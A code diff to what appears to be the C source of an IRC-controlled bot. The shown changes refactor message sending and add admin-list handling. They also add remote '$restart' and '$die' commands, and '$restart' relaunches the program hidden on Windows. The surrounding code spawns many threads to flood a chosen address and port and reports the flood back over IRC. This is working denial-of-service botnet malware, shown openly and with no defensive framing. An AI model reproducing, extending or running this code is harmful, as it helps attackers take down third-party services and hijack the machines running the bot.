@@ -24,8 +24,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <limits.h>
+#include <stdarg.h>
+#include <unistd.h>
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
@@ -43,6 +44,19 @@
 #include "bot.h"
 
 #define DEFAULT_ARG_SIZE 10
+
+char *prog_name;
+
+int my_send (SOCKET s, const char *fmt, ...) {
+    char buf[MAX_MSG_SIZE];
+    va_list send_args;
+    va_start (send_args, fmt);
+
+    vsnprintf (buf, sizeof (buf), fmt, send_args);
+    va_end (send_args);
+
+    return send (s, buf, strlen (buf), 0);
+}
 
 /*
  * function to check if user
@@ -74,7 +88,8 @@ int add_admin (pAccount a, pMessage m) {
         // check if admin array needs to be expanded
         if (a->num_admins >= a->admin_size) {
             // expand array with realloc
-            a->admins = realloc (a->admins, sizeof (char *)*(a->admin_size*2+1));
+            a->admins = realloc (a->admins, 
+                                sizeof (char *)*(a->admin_size*2+1));
             if (a->admins == NULL) {
                 return FALSE;
             }
@@ -234,12 +249,10 @@ int parse_args (SOCKET s, pMessage m) {
     // function pointer to get appropriate function
     void *(*flood_func)(void *) = get_flood_function (argv[0]);
     
-    char output[MAX_MSG_SIZE];
-
-    snprintf (output, sizeof (output), "PRIVMSG %s :%s flooding %s:%s with %d threads for %ds.\r\n", 
+    my_send (ta->s, "PRIVMSG %s :%s flooding %s:%s" 
+                "with %d threads for %ds.\r\n", 
                 ta->contact, argv[0]+1, ta->addr, ta->port, 
                 ta->threads, ta->time);
-    send (ta->s, output, strlen (output), 0);
 
     // thread flood routine
     for (i = 0; i < ta->threads; i++) {
@@ -247,7 +260,8 @@ int parse_args (SOCKET s, pMessage m) {
 
         DWORD thr_id[ta->threads];
         HANDLE hThr;
-        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, ta, 0, &thr_id[i]);
+        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, 
+                            ta, 0, &thr_id[i]);
         if (hThr == NULL) {
             fatal ("Thread flooder");
         }
@@ -268,6 +282,47 @@ int parse_args (SOCKET s, pMessage m) {
 
     free (argv);
     free (ta);
+
+    return TRUE;
+}
+
+int execute_command (SOCKET s, pAccount a, pMessage m) {
+    int err;
+    const char *contact = m->contact;
+    if (strcmp (contact, a->n_name) == 0) {
+        contact = m->n_name;
+    }
+
+    if (strncmp (m->command, "$restart", 8) == 0) {
+        err = cleanup (s, a, m);
+        if (err == -1) {
+            non_fatal ("Cleanup");
+        }
+
+        my_send (s, "PRIVMSG %s :Restarting...\r\n", contact);
+        my_send (s, "QUIT :Manual restart\r\n");
+
+#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
+        ShellExecute (NULL, "open", prog_name, NULL, NULL, SW_HIDE);
+
+#elif defined(__linux__)
+        
+        execv (prog_name, &prog_name);
+
+#endif
+
+    } else if (strncmp (m->command, "$die", 4) == 0) {
+        err = cleanup (s, a, m);
+        if (err == -1) {
+            non_fatal ("Cleanup");
+        }
+
+        my_send (s, "PRIVMSG %s :Dying...\r\n", contact);
+        my_send (s, "QUIT :Died\r\n");
+        
+        exit (EXIT_SUCCESS);
+    }
 
     return TRUE;
 }
